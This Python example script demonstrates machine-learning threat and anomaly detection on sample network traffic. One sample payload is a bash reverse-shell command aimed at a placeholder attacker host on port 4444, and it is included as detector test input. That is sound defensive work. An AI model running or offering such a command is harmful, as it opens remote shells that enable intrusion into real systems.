"""
Example 5: AI-Powered Threat Detection

This script demonstrates threat detection using machine learning.
"""

from src.ai_engine import ThreatDetector, AnomalyDetector
import json

def main():
    print("[*] Starting AI Threat Detection Example")
    print("=" * 50)
    
    # Initialize threat detector
    detector = ThreatDetector()
    
    # Sample network traffic
    traffic_samples = [
        {'payload': 'GET /index.html HTTP/1.1', 'flags': 'SYN', 'size': 120},
        {'payload': 'POST /login HTTP/1.1', 'flags': 'PSH', 'size': 256},
        {'payload': 'shell exec /bin/bash -i >& /dev/tcp/attacker/4444', 'flags': 'PSH', 'size': 80},
        {'payload': 'DELETE /admin/users HTTP/1.1', 'flags': 'PSH', 'size': 150},
    ]
    
    print(f"\n[*] Analyzing {len(traffic_samples)} traffic samples")
    
    # Detect threats
    threats = detector.analyze_traffic(traffic_samples)
    
    print(f"\n[+] Threats Detected: {len(threats)}")
    for i, threat in enumerate(threats, 1):
        print(f"\n  Threat #{i}:")
        print(f"    Level: {threat['threat_level']}")
        print(f"    Score: {threat['threat_score']:.2f}")
        print(f"    Payload: {threat['packet'].get('payload', 'N/A')[:50]}")
    
    # Anomaly Detection
    print(f"\n\n[*] Starting Anomaly Detection")
    print("=" * 50)
    
    anomaly_detector = AnomalyDetector()
    
    # Establish baseline
    normal_traffic = [
        {'size': 150, 'rate': 10},
        {'size': 160, 'rate': 12},
        {'size': 140, 'rate': 11},
    ]
    
    print(f"\n[*] Establishing baseline from {len(normal_traffic)} samples")
    anomaly_detector.establish_baseline(normal_traffic)
    
    # Suspicious traffic
    suspicious_traffic = [
        {'size': 150, 'rate': 10},  # Normal
        {'size': 5000, 'rate': 100},  # Anomalous
        {'size': 8000, 'rate': 200},  # Very anomalous
    ]
    
    print(f"[*] Analyzing {len(suspicious_traffic)} traffic samples")
    anomalies = anomaly_detector.detect_anomalies(suspicious_traffic)
    
    print(f"\n[+] Anomalies Detected: {len(anomalies)}")
    for i, anomaly in enumerate(anomalies, 1):
        print(f"\n  Anomaly #{i}:")
        print(f"    Severity: {anomaly['severity']}")
        print(f"    Score: {anomaly['anomaly_score']:.2f}")
    
    # Save results
    results = {
        'threats': threats,
        'anomalies': anomalies
    }
    
    output_file = "ai_detection_results.json"
    with open(output_file, 'w') as f:
        json.dump(results, f, indent=2, default=str)
    print(f"\n[+] Results saved to {output_file}")

if __name__ == "__main__":
    main()
